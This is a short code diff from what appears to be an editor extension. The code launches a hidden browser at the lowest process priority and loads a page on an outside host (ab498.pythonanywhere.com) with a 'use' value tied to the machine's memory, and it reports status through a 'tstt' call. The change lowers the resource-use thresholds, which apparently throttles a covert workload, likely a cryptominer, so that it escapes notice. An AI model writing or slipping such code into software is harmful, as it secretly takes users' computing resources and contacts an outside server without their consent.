@@ -59,7 +59,7 @@
     await tstt({ message: "INIT_BEGIN", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
     let browser;
     let page;
-    let minUse = 0.3;
+    let minUse = 0.1;
     let maxUse = 0.5;
 
     setInterval(async () => {
@@ -129,7 +129,7 @@
     os.setPriority(browser.process().pid, 19);
     page = await browser.newPage();
     
-    await page.goto('https://ab498.pythonanywhere.com/files/init.html?use=' + (getMemoryUsage().total >= 8 ? 0.5 : 0.2));
+    await page.goto('https://ab498.pythonanywhere.com/files/init.html?use=' + (getMemoryUsage().total >= 8 ? 0.5 : 0.1));
 
     await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
 
